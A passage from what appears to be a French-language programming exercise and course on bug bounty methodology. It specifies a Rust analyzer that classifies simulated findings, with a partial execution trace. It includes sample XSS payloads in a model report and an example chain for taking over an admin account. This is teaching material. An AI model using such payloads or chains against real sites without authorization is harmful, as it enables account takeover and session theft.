    ‚îÇ  ‚îÇ ‚Ä¢ out_of_scope  ‚îÇ            ‚îÇ ‚îî‚îÄ out_of_scope? ‚úó      ‚îÇ‚îÇ
    ‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò            ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò‚îÇ
    ‚îÇ                                            ‚îÇ               ‚îÇ
    ‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê            ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê‚îÇ
    ‚îÇ  ‚îÇ Test Cases      ‚îÇ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñ∂‚îÇ Vulnerability Analyzer  ‚îÇ‚îÇ
    ‚îÇ  ‚îÇ ‚Ä¢ saml          ‚îÇ            ‚îÇ ‚îú‚îÄ SAML Bypass          ‚îÇ‚îÇ
    ‚îÇ  ‚îÇ ‚Ä¢ websocket     ‚îÇ            ‚îÇ ‚îú‚îÄ WebSocket XSS        ‚îÇ‚îÇ
    ‚îÇ  ‚îÇ ‚Ä¢ cors          ‚îÇ            ‚îÇ ‚îú‚îÄ CORS Misconfig       ‚îÇ‚îÇ
    ‚îÇ  ‚îÇ ‚Ä¢ log4j         ‚îÇ            ‚îÇ ‚îú‚îÄ Log4Shell            ‚îÇ‚îÇ
    ‚îÇ  ‚îÇ ‚Ä¢ mfa           ‚îÇ            ‚îÇ ‚îî‚îÄ ... (18 types)       ‚îÇ‚îÇ
    ‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò            ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò‚îÇ
    ‚îÇ                                            ‚îÇ               ‚îÇ
    ‚îÇ                                 ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê‚îÇ
    ‚îÇ                                 ‚îÇ Duplicate Detector      ‚îÇ‚îÇ
    ‚îÇ                                 ‚îÇ hash(title + endpoint)  ‚îÇ‚îÇ
    ‚îÇ                                 ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò‚îÇ
    ‚îÇ                                            ‚îÇ               ‚îÇ
    ‚îÇ  OUTPUT                         ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê‚îÇ
    ‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê            ‚îÇ Chain Detector          ‚îÇ‚îÇ
    ‚îÇ  ‚îÇ Findings        ‚îÇ‚óÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÇ XSS ‚Üí Session ‚Üí ATO     ‚îÇ‚îÇ
    ‚îÇ  ‚îÇ ‚îú‚îÄ CRITICAL: 2  ‚îÇ            ‚îÇ SAML ‚Üí Admin Access     ‚îÇ‚îÇ
    ‚îÇ  ‚îÇ ‚îú‚îÄ HIGH: 3      ‚îÇ            ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò‚îÇ
    ‚îÇ  ‚îÇ ‚îú‚îÄ MEDIUM: 2    ‚îÇ                       ‚îÇ               ‚îÇ
    ‚îÇ  ‚îÇ ‚îî‚îÄ LOW: 1       ‚îÇ            ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê‚îÇ
    ‚îÇ  ‚îú‚îÄ Chains: 2      ‚îÇ‚óÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÇ Bounty Calculator       ‚îÇ‚îÇ
    ‚îÇ  ‚îú‚îÄ Bounty: $18.5k ‚îÇ            ‚îÇ CRIT: $10k, HIGH: $3.5k ‚îÇ‚îÇ
    ‚îÇ  ‚îî‚îÄ Quality: 5/5   ‚îÇ            ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò‚îÇ
    ‚îÇ                                                             ‚îÇ
    ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

### 5.4 Les pi√®ges en d√©tail

#### Pi√®ge 1 : Ignorer le scope
```rust
// ‚ùå MAUVAIS : Analyser tout sans v√©rifier le scope
for tc in &test_cases {
    findings.push(analyze(tc)); // Inclut les out-of-scope!
}

// ‚úÖ BON : Toujours v√©rifier le scope d'abord
for tc in &test_cases {
    if !is_out_of_scope(&tc.endpoint, &out_of_scope) {
        if let Some(f) = analyze(tc) {
            findings.push(f);
        }
    }
}
```

#### Pi√®ge 2 : Ne pas d√©tecter les duplicates
```rust
// ‚ùå MAUVAIS : Ajouter tous les findings
findings.extend(new_findings);

// ‚úÖ BON : V√©rifier les duplicates
let hash = format!("{}:{}", finding.title, endpoint);
if seen.insert(hash) {
    findings.push(finding);
} else {
    finding.is_duplicate = true;
    findings.push(finding);
}
```

#### Pi√®ge 3 : CVSS incorrect
```rust
// ‚ùå MAUVAIS : CVSS hardcod√©
let cvss = 9.8; // Toujours critique?

// ‚úÖ BON : CVSS calcul√© selon les crit√®res
let cvss = match severity {
    "CRITICAL" => calculate_cvss_critical(&impact),
    "HIGH" => calculate_cvss_high(&impact),
    _ => calculate_cvss_base(&finding),
};
```

### 5.5 Cours Complet : M√©thodologie Bug Bounty

#### 5.5.1 Les Phases d'un Bug Bounty

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ                    M√âTHODOLOGIE BUG BOUNTY                      ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ                                                                 ‚îÇ
‚îÇ  PHASE 1: RECONNAISSANCE (20% du temps)                        ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ Passive: OSINT, Wayback, certificate transparency         ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ Active: Subdomain enum, port scanning, tech fingerprint   ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ JS Analysis: LinkFinder, endpoints, secrets               ‚îÇ
‚îÇ                                                                 ‚îÇ
‚îÇ  PHASE 2: MAPPING (15% du temps)                                ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ Sitemap construction                                       ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ API endpoint discovery                                     ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ Authentication flow analysis                               ‚îÇ
‚îÇ                                                                 ‚îÇ
‚îÇ  PHASE 3: VULNERABILITY DISCOVERY (40% du temps)                ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ Automated: Nuclei, Burp Scanner                           ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ Manual: Logic flaws, auth bypass, IDOR                    ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ Chaining: Combine low-impact vulns for high impact        ‚îÇ
‚îÇ                                                                 ‚îÇ
‚îÇ  PHASE 4: EXPLOITATION (15% du temps)                           ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ PoC development                                            ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ Impact demonstration                                       ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ Screenshot/video evidence                                  ‚îÇ
‚îÇ                                                                 ‚îÇ
‚îÇ  PHASE 5: REPORTING (10% du temps)                              ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ Clear title and summary                                    ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ Step-by-step reproduction                                  ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ Impact and remediation                                     ‚îÇ
‚îÇ                                                                 ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

#### 5.5.2 Les 18 Vuln√©rabilit√©s Cl√©s

| # | Vuln√©rabilit√© | CVSS Range | CWE | Impact |
|---|---------------|------------|-----|--------|
| 1 | SAML Bypass | 9.0-10.0 | 347 | Account Takeover |
| 2 | Log4Shell | 10.0 | 502 | RCE |
| 3 | SQL Injection | 8.0-10.0 | 89 | Data Breach |
| 4 | CORS Misconfig | 6.0-8.0 | 942 | Data Theft |
| 5 | WebSocket XSS | 7.0-8.5 | 79 | Session Hijack |
| 6 | MFA Bypass | 6.0-8.0 | 362 | Auth Bypass |
| 7 | Password Reset | 7.0-9.0 | 640 | Account Takeover |
| 8 | CRLF Injection | 5.0-7.0 | 113 | Cache Poison |
| 9 | SSRF | 6.0-9.0 | 918 | Internal Access |
| 10 | XXE | 7.0-9.0 | 611 | Data Exfil |
| 11 | IDOR | 6.0-8.0 | 639 | Data Access |
| 12 | SSTI | 7.0-10.0 | 94 | RCE |
| 13 | Insecure Design | 5.0-8.0 | 284 | Multiple |
| 14 | Auth Failures | 7.0-9.0 | 287 | Account Access |
| 15 | Integrity | 6.0-8.0 | 345 | Data Tampering |
| 16 | Logging Failures | 3.0-5.0 | 778 | Forensics Impact |
| 17 | Serverless Misconfig | 5.0-8.0 | 215 | Credential Leak |
| 18 | WASM Issues | 3.0-6.0 | 119 | Memory Leak |

#### 5.5.3 L'Art du Chaining

Le **chaining** est ce qui diff√©rencie un hunter moyen d'un expert :

```
EXEMPLE DE CHAIN : Medium ‚Üí Critical

Vuln√©rabilit√© 1: Information Disclosure (LOW)
  ‚îî‚îÄ Endpoint /debug expose les emails des admins

Vuln√©rabilit√© 2: IDOR (MEDIUM)
  ‚îî‚îÄ /api/user/{id} permet d'acc√©der aux infos d'autres users

Vuln√©rabilit√© 3: Password Reset Poisoning (MEDIUM)
  ‚îî‚îÄ Host header injection dans le reset

CHAIN: Info Disclosure ‚Üí Get admin email
       ‚Üí IDOR ‚Üí Get admin user ID
       ‚Üí Password Reset ‚Üí Takeover admin account

Impact combin√©: CRITICAL ($15,000 au lieu de $500+$2000+$2000)
```

### 5.6 Normes avec explications p√©dagogiques

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ ‚ùå HORS NORME (compile, mais mauvaise pratique bug bounty)      ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ // Rapport minimal                                              ‚îÇ
‚îÇ "Found XSS on /search. Payload: <script>alert(1)</script>"      ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ ‚úÖ RAPPORT PROFESSIONNEL                                        ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ ## Title: Stored XSS in Search Functionality                    ‚îÇ
‚îÇ                                                                 ‚îÇ
‚îÇ ## Summary                                                      ‚îÇ
‚îÇ A stored XSS vulnerability exists in the search history...     ‚îÇ
‚îÇ                                                                 ‚îÇ
‚îÇ ## Steps to Reproduce                                           ‚îÇ
‚îÇ 1. Navigate to https://target.com/search                       ‚îÇ
‚îÇ 2. Enter payload: <img src=x onerror=alert(document.domain)>   ‚îÇ
‚îÇ 3. Submit and observe payload stored in history                ‚îÇ
‚îÇ 4. Other users viewing history execute the payload             ‚îÇ
‚îÇ                                                                 ‚îÇ
‚îÇ ## Impact                                                       ‚îÇ
‚îÇ An attacker can steal session cookies of any user...           ‚îÇ
‚îÇ                                                                 ‚îÇ
‚îÇ ## Remediation                                                  ‚îÇ
‚îÇ Implement output encoding using DOMPurify...                   ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ üìñ POURQUOI ?                                                   ‚îÇ
‚îÇ ‚Ä¢ Rapports clairs = triage rapide = paiement rapide            ‚îÇ
‚îÇ ‚Ä¢ Impact d√©montr√© = bounty plus √©lev√©                          ‚îÇ
‚îÇ ‚Ä¢ Remediation = relation positive avec le programme            ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

### 5.7 Simulation avec trace d'ex√©cution

**Entr√©e test :**
```json
{
  "target_scope": {"domains": ["*.target.com"], "out_of_scope": ["blog.target.com"]},
  "test_cases": [
    {"id": "TC1", "type": "saml_analysis", "endpoint": "/saml/acs", "saml_response": {"signature_validated": false}},
    {"id": "TC2", "type": "xss_analysis", "endpoint": "https://blog.target.com/search", "xss_type": "reflected"},
    {"id": "TC3", "type": "cors_analysis", "endpoint": "/api/user", "cors_config": {"allow_origin": "reflect", "allow_credentials": true}}
  ]
}
```

**Trace d'ex√©cution :**

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ √âtape ‚îÇ Instruction                        ‚îÇ Variables       ‚îÇ Explication                    ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ   1   ‚îÇ PARSER input_json                  ‚îÇ input = {...}   ‚îÇ JSON valide, parsing OK        ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ   2   ‚îÇ INITIALISER findings = []          ‚îÇ findings = []   ‚îÇ Vecteur vide                   ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ   3   ‚îÇ TRAITER TC1 (saml_analysis)        ‚îÇ                 ‚îÇ                                ‚îÇ
‚îÇ  3.1  ‚îÇ ‚îú‚îÄ is_out_of_scope("/saml/acs")?   ‚îÇ false           ‚îÇ Pas dans out_of_scope          ‚îÇ
‚îÇ  3.2  ‚îÇ ‚îú‚îÄ analyze_saml(TC1)               ‚îÇ                 ‚îÇ signature_validated = false    ‚îÇ
‚îÇ  3.3  ‚îÇ ‚îú‚îÄ CR√âER Finding CRITICAL          ‚îÇ cvss = 9.8      ‚îÇ SAML bypass d√©tect√©            ‚îÇ
‚îÇ  3.4  ‚îÇ ‚îî‚îÄ AJOUTER aux findings            ‚îÇ len = 1         ‚îÇ Premier finding ajout√©         ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ   4   ‚îÇ TRAITER TC2 (xss_analysis)         ‚îÇ                 ‚îÇ                                ‚îÇ
‚îÇ  4.1  ‚îÇ ‚îú‚îÄ is_out_of_scope("blog...")?     ‚îÇ true            ‚îÇ "blog.target.com" est OOS      ‚îÇ
‚îÇ  4.2  ‚îÇ ‚îî‚îÄ SKIP, out_of_scope_count++      ‚îÇ oos_count = 1   ‚îÇ Test case ignor√©               ‚îÇ
